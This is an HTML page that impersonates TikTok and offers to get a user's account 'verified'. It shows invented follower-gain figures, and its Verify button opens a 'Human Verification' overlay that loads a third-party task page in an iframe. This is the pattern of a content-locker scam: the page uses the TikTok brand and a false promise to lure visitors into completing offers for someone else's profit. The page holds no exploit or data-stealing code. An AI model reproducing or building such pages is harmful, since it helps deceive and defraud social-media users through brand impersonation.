<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TikTok Verify</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:Arial, Helvetica, sans-serif;
  min-height:100vh;
  overflow-x:hidden;
  position:relative;
  background:
  linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.55)),
  url('https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?auto=format&fit=crop&w=1600&q=80')
  center center/cover no-repeat;
}

body::before{
  content:"";
  position:fixed;
  inset:0;
  backdrop-filter:blur(8px);
  z-index:0;
}

/* Main wrapper */
.wrapper{
  position:relative;
  z-index:2;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  padding:30px 15px;
}

/* Card */
.card{
  width:420px;
  max-width:92%;
  padding:34px 28px;
  border-radius:24px;
  background:rgba(8,8,8,.72);
  border:1px solid rgba(255,255,255,.12);
  box-shadow:0 20px 50px rgba(0,0,0,.45);
  text-align:center;
}

.logo{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:12px;
  margin-bottom:22px;
}

.logo i{
  font-size:42px;
  color:#25F4EE;
  text-shadow:2px 0 #FE2C55;
}

.logo h2{
  color:#fff;
  font-size:44px;
  font-weight:800;
}

.title{
  color:#fff;
  font-size:31px;
  font-weight:800;
  margin-bottom:12px;
}

.sub{
  color:#d7d7d7;
  font-size:18px;
  margin-bottom:24px;
}

.input-wrap{
  height:66px;
  border-radius:16px;
  padding:0 18px;
  display:flex;
  align-items:center;
  gap:14px;
  background:rgba(255,255,255,.04);
  border:1px solid rgba(255,255,255,.15);
  margin-bottom:18px;
}

.input-wrap i{
  color:#fff;
  font-size:28px;
}

.input-wrap input{
  flex:1;
  height:100%;
  border:none;
  outline:none;
  background:transparent;
  color:#fff;
  font-size:20px;
}

.input-wrap input::placeholder{
  color:#a8a8a8;
}

.btn{
  width:100%;
  height:66px;
  border:none;
  border-radius:16px;
  font-size:30px;
  font-weight:800;
  color:#fff;
  cursor:pointer;
  background:linear-gradient(90deg,#FE2C55 0%,#ff1f72 45%,#25F4EE 100%);
  box-shadow:0 10px 25px rgba(254,44,85,.28);
  transition: transform 0.2s;
}

.btn:active {
  transform: scale(0.98);
}

/* Modal Locker Styling */
.locker-overlay {
  display: none; /* Hidden by default */
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.85);
  z-index: 9999;
  justify-content: center;
  align-items: center;
}

.locker-content {
  width: 90%;
  max-width: 500px;
  background: #121212;
  border-radius: 20px;
  border: 1px solid #333;
  overflow: hidden;
  position: relative;
  animation: modalFadeIn 0.3s ease-out;
}

@keyframes modalFadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

.locker-header {
  padding: 20px;
  text-align: center;
  border-bottom: 1px solid #222;
}

.locker-header h3 {
  color: #fff;
  font-size: 20px;
  margin-bottom: 5px;
}

.locker-header p {
  color: #a8a8a8;
  font-size: 14px;
}

.iframe-container {
  width: 100%;
  height: 450px;
}

iframe {
  width: 100%;
  height: 100%;
  border: none;
}

/* Stats under card */
.bottom{
  margin-top:18px;
  display:flex;
  gap:40px;
  color:#fff;
  justify-content:center;
  flex-wrap:wrap;
}

.bottom .b{
  display:flex;
  align-items:center;
  gap:10px;
  font-size:18px;
  font-weight:700;
}

.bottom .b i{
  font-size:28px;
}

/* Followers section */
.history{
  width:100%;
  max-width:950px;
  margin-top:auto;
  padding-top:30px;
  display:grid;
  grid-template-columns:repeat(4,1fr);
  gap:12px;
}

.box{
  background:rgba(8,8,8,.72);
  border:1px solid rgba(255,255,255,.10);
  border-radius:16px;
  padding:14px;
  color:#fff;
  text-align:center;
}

.day{
  font-size:14px;
  color:#cfcfcf;
  margin-bottom:6px;
}

.follow{
  font-size:24px;
  font-weight:800;
  color:#25F4EE;
}

.time{
  font-size:13px;
  color:#9e9e9e;
  margin-top:6px;
}

@media(max-width:768px){
  .wrapper{
    justify-content:flex-start;
    padding-top:30px;
  }
  .history{
    grid-template-columns:repeat(2,1fr);
    margin-top:35px;
  }
  .card { width: 100%; }
}
</style>
</head>

<body>

<div class="wrapper">

  <div class="card">
    <div class="logo">
      <i class="fa-brands fa-tiktok"></i>
      <h2>TikTok</h2>
    </div>

    <div class="title">Get Your TikTok Account Verified!</div>
    <div class="sub">Enter your TikTok username to get started.</div>

    <div class="input-wrap">
      <i class="fa-solid fa-at"></i>
      <input type="text" id="username" placeholder="Enter your username">
    </div>

    <button class="btn" onclick="openLocker()">Verify</button>
  </div>

  <div class="bottom">
    <div class="b"><i class="fa-solid fa-heart"></i>234.5K</div>
    <div class="b"><i class="fa-solid fa-comment-dots"></i>87.2K</div>
    <div class="b"><i class="fa-solid fa-bookmark"></i></div>
  </div>

  <div class="history">
    <div class="box">
      <div class="day">Today</div>
      <div class="follow">+12,540</div>
      <div class="time">2 min ago</div>
    </div>
    <div class="box">
        <div class="day">Yesterday</div>
        <div class="follow">+9,870</div>
        <div class="time">11:43 PM</div>
      </div>
  
      <div class="box">
        <div class="day">Monday</div>
        <div class="follow">+15,220</div>
        <div class="time">8:15 PM</div>
      </div>
  
      <div class="box">
        <div class="day">Sunday</div>
        <div class="follow">+7,430</div>
        <div class="time">6:02 PM</div>
      </div>
  </div>

</div>

<div class="locker-overlay" id="lockerOverlay">
  <div class="locker-content">
    <div class="locker-header">
      <h3>Human Verification</h3>
      <p>Please complete one task to verify your account</p>
    </div>
    <div class="iframe-container">
      <iframe src="https://ogam.site/cl/i/8229kj" id="lockerIframe"></iframe>
    </div>
  </div>
</div>

<script>
  function openLocker() {
    const user = document.getElementById('username').value;
    if(user.length < 3) {
      alert("Please enter a valid username");
      return;
    }
    
    // Show the locker modal
    document.getElementById('lockerOverlay').style.display = 'flex';
  }

  // Close modal if user clicks outside the content
  window.onclick = function(event) {
    const modal = document.getElementById('lockerOverlay');
    if (event.target == modal) {
      modal.style.display = "none";
    }
  }
</script>

</body>
</html>
